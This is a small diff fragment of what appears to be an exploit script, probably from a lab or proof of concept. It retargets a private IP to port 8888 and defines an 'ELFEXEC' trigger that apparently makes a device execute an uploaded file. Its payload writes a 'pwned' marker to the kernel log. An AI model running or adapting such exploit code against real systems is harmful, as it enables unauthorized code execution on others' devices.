@@ -5,7 +5,7 @@ import time
 
 
 TARGET_IP = '192.168.1.104'
-TARGET_PORT = 8699 
+TARGET_PORT = 8888 
 TRIGGER_ELFEXEC="<ELFEXEC><FNAME>exploit</FNAME><FSIZE>34</FSIZE></ELFEXEC>"
 
 payload_sled = "echo pwned_by_cr0cus > /dev/kmsg\n"
